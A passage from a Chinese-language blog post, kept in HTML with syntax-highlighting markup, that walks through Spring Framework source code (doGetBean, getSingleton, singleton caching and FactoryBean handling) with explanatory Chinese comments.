punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> factory <span class="token keyword">instanceof</span> <span class="token class-name">SmartFactoryBean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            isEagerInit <span class="token operator">=</span> AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PrivilegedAction<span class="token operator">&lt;</span>Boolean<span class="token operator">></span><span class="token punctuation">)</span>                                            <span class="token punctuation">(</span><span class="token punctuation">(</span>SmartFactoryBean<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">)</span> factory<span class="token punctuation">)</span><span class="token operator">:</span><span class="token operator">:</span>isEagerInit<span class="token punctuation">,</span>                                    <span class="token function">getAccessControlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">else</span> <span class="token punctuation">{</span>                            isEagerInit <span class="token operator">=</span> <span class="token punctuation">(</span>factory <span class="token keyword">instanceof</span> <span class="token class-name">SmartFactoryBean</span> <span class="token operator">&amp;&amp;</span>                                    <span class="token punctuation">(</span><span class="token punctuation">(</span>SmartFactoryBean<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">)</span> factory<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isEagerInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>isEagerInit<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token comment" spellcheck="true">// 预初始化bean，从容器中获取bean,没有就初始化一下</span>                            <span class="token function">getBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token function">getBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Trigger post-initialization callback for all applicable beans...</span>        <span class="token comment" spellcheck="true">// 触发后置初始化的callback</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>String beanName <span class="token operator">:</span> beanNames<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Object singletonInstance <span class="token operator">=</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>singletonInstance <span class="token keyword">instanceof</span> <span class="token class-name">SmartInitializingSingleton</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">final</span> SmartInitializingSingleton smartSingleton <span class="token operator">=</span> <span class="token punctuation">(</span>SmartInitializingSingleton<span class="token punctuation">)</span> singletonInstance<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PrivilegedAction<span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                        smartSingleton<span class="token punctuation">.</span><span class="token function">afterSingletonsInstantiated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span> null<span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token function">getAccessControlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token punctuation">{</span>                    smartSingleton<span class="token punctuation">.</span><span class="token function">afterSingletonsInstantiated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>那么核心代码无疑就是<code>getBean</code>方法，我们要看的重点方法：getSingleton、getObjectForBeanInstance()、createBean()</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractBeanFactory</span> <span class="token keyword">extends</span> <span class="token class-name">FactoryBeanRegistrySupport</span> <span class="token keyword">implements</span> <span class="token class-name">ConfigurableBeanFactory</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//---------------------------------------------------------------------</span>    <span class="token comment" spellcheck="true">// Implementation of BeanFactory interface</span>    <span class="token comment" spellcheck="true">//---------------------------------------------------------------------</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getBean</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> BeansException <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">doGetBean</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> null<span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Return an instance, which may be shared or independent, of the specified bean.     * @param name the name of the bean to retrieve     * @param requiredType the required type of the bean to retrieve     * @param args arguments to use when creating a bean instance using explicit arguments     * (only applied when creating a new instance as opposed to retrieving an existing one)     * @param typeCheckOnly whether the instance is obtained for a type check,     * not for actual use     * @return an instance of the bean     * @throws BeansException if the bean could not be created     */</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>    <span class="token keyword">protected</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">doGetBean</span><span class="token punctuation">(</span><span class="token keyword">final</span> String name<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> <span class="token keyword">final</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> requiredType<span class="token punctuation">,</span>            <span class="token annotation punctuation">@Nullable</span> <span class="token keyword">final</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">,</span> <span class="token keyword">boolean</span> typeCheckOnly<span class="token punctuation">)</span> <span class="token keyword">throws</span> BeansException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 处理beanNmae,因为BeanFactory和FactoryBean不同，FactoryBean是带着“&amp;”符号</span>        <span class="token keyword">final</span> String beanName <span class="token operator">=</span> <span class="token function">transformedBeanName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object bean<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Eagerly check singleton cache for manually registered singletons.</span>         <span class="token comment" spellcheck="true">// 从缓存中获取单例对象</span>        Object sharedInstance <span class="token operator">=</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sharedInstance <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> args <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isSingletonCurrentlyInCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Returning eagerly cached instance of singleton bean '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span>                            <span class="token string">"' that is not fully initialized yet - a consequence of a circular reference"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token punctuation">{</span>                    logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Returning cached instance of singleton bean '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            bean <span class="token operator">=</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>sharedInstance<span class="token punctuation">,</span> name<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Fail if we're already creating this bean instance:</span>            <span class="token comment" spellcheck="true">// We're assumably within a circular reference.</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPrototypeCurrentlyInCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCurrentlyInCreationException</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// Check if bean definition exists in this factory.</span>            BeanFactory parentBeanFactory <span class="token operator">=</span> <span class="token function">getParentBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>parentBeanFactory <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">containsBeanDefinition</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Not found -> check parent.</span>                String nameToLookup <span class="token operator">=</span> <span class="token function">originalBeanName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>parentBeanFactory <span class="token keyword">instanceof</span> <span class="token class-name">AbstractBeanFactory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>AbstractBeanFactory<span class="token punctuation">)</span> parentBeanFactory<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">doGetBean</span><span class="token punctuation">(</span>                            nameToLookup<span class="token punctuation">,</span> requiredType<span class="token punctuation">,</span> args<span class="token punctuation">,</span> typeCheckOnly<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>args <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// Delegation to parent with explicit args.</span>                    <span class="token keyword">return</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span> parentBeanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>nameToLookup<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>requiredType <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// No args -> delegate to standard getBean method.</span>                    <span class="token keyword">return</span> parentBeanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>nameToLookup<span class="token punctuation">,</span> requiredType<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span> parentBeanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>nameToLookup<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>typeCheckOnly<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">markBeanAsCreated</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token keyword">final</span> RootBeanDefinition mbd <span class="token operator">=</span> <span class="token function">getMergedLocalBeanDefinition</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkMergedBeanDefinition</span><span class="token punctuation">(</span>mbd<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// Guarantee initialization of beans that the current bean depends on.</span>                String<span class="token punctuation">[</span><span class="token punctuation">]</span> dependsOn <span class="token operator">=</span> mbd<span class="token punctuation">.</span><span class="token function">getDependsOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dependsOn <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>String dep <span class="token operator">:</span> dependsOn<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDependent</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> dep<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span>                                    <span class="token string">"Circular depends-on relationship between '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"' and '"</span> <span class="token operator">+</span> dep <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token function">registerDependentBean</span><span class="token punctuation">(</span>dep<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">try</span> <span class="token punctuation">{</span>                            <span class="token function">getBean</span><span class="token punctuation">(</span>dep<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchBeanDefinitionException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span>                                    <span class="token string">"'"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"' depends on missing bean '"</span> <span class="token operator">+</span> dep <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// Create bean instance.</span>                <span class="token comment" spellcheck="true">// 创建单例对象</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">isSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sharedInstance <span class="token operator">=</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                        <span class="token keyword">try</span> <span class="token punctuation">{</span>                            <span class="token keyword">return</span> <span class="token function">createBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeansException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token comment" spellcheck="true">// Explicitly remove instance from singleton cache: It might have been put there</span>                            <span class="token comment" spellcheck="true">// eagerly by the creation process, to allow for circular reference resolution.</span>                            <span class="token comment" spellcheck="true">// Also remove any beans that received a temporary reference to the bean.</span>                            <span class="token function">destroySingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    bean <span class="token operator">=</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>sharedInstance<span class="token punctuation">,</span> name<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// 创建多例的原型对象</span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">isPrototype</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// It's a prototype -> create a new instance.</span>                    Object prototypeInstance <span class="token operator">=</span> null<span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        <span class="token function">beforePrototypeCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                        prototypeInstance <span class="token operator">=</span> <span class="token function">createBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">finally</span> <span class="token punctuation">{</span>                        <span class="token function">afterPrototypeCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    bean <span class="token operator">=</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>prototypeInstance<span class="token punctuation">,</span> name<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// scope类型的：request,session等</span>                <span class="token keyword">else</span> <span class="token punctuation">{</span>                    String scopeName <span class="token operator">=</span> mbd<span class="token punctuation">.</span><span class="token function">getScope</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">final</span> Scope scope <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>scopes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>scopeName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>scope <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span><span class="token string">"No Scope registered for scope name '"</span> <span class="token operator">+</span> scopeName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        Object scopedInstance <span class="token operator">=</span> scope<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                            <span class="token function">beforePrototypeCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">try</span> <span class="token punctuation">{</span>                                <span class="token keyword">return</span> <span class="token function">createBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">finally</span> <span class="token punctuation">{</span>                                <span class="token function">afterPrototypeCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        bean <span class="token operator">=</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>scopedInstance<span class="token punctuation">,</span> name<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalStateException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span>                                <span class="token string">"Scope '"</span> <span class="token operator">+</span> scopeName <span class="token operator">+</span> <span class="token string">"' is not active for the current thread; consider "</span> <span class="token operator">+</span>                                <span class="token string">"defining a scoped proxy for this bean if you intend to refer to it from a singleton"</span><span class="token punctuation">,</span>                                ex<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeansException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">cleanupAfterBeanCreationFailure</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Check if required type matches the type of the actual bean instance.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>requiredType <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>requiredType<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>bean<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                T convertedBean <span class="token operator">=</span> <span class="token function">getTypeConverter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">convertIfNecessary</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> requiredType<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>convertedBean <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanNotOfRequiredTypeException</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> requiredType<span class="token punctuation">,</span> bean<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">return</span> convertedBean<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">TypeMismatchException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Failed to convert bean '"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"' to required type '"</span> <span class="token operator">+</span>                            ClassUtils<span class="token punctuation">.</span><span class="token function">getQualifiedName</span><span class="token punctuation">(</span>requiredType<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanNotOfRequiredTypeException</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> requiredType<span class="token punctuation">,</span> bean<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span> bean<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>通过beanName，尝试从缓存中获取单例</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span>    <span class="token annotation punctuation">@Nullable</span>    <span class="token keyword">public</span> Object <span class="token function">getSingleton</span><span class="token punctuation">(</span>String beanName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/**     * Return the (raw) singleton object registered under the given name.     * &lt;p>Checks already instantiated singletons and also allows for an early     * reference to a currently created singleton (resolving a circular reference).     * @param beanName the name of the bean to look for     * @param allowEarlyReference whether early references should be created or not     * @return the registered singleton object, or {@code null} if none found     */</span>    <span class="token annotation punctuation">@Nullable</span>    <span class="token keyword">protected</span> Object <span class="token function">getSingleton</span><span class="token punctuation">(</span>String beanName<span class="token punctuation">,</span> <span class="token keyword">boolean</span> allowEarlyReference<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// singletonObjects是个map，也就是说，单例是缓存在map中的，从singletonObjects中尝试获取</span>        Object singletonObject <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>singletonObjects<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>singletonObject <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> <span class="token function">isSingletonCurrentlyInCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>singletonObjects<span class="token punctuation">)</span> <span class="token punctuation">{</span>                singletonObject <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>earlySingletonObjects<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>singletonObject <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> allowEarlyReference<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    ObjectFactory<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> singletonFactory <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>singletonFactories<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>singletonFactory <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        singletonObject <span class="token operator">=</span> singletonFactory<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>earlySingletonObjects<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> singletonObject<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>singletonFactories<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> singletonObject<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><code>getObjectForBeanInstance</code>该方法主要是判断当前bean是否为FactoryBean，如果是FactoryBean，则用FactoryBean创建对象（<code>getObjectFromFactoryBean</code>），否则直接返回对象</p><pre class=" language-java"><code 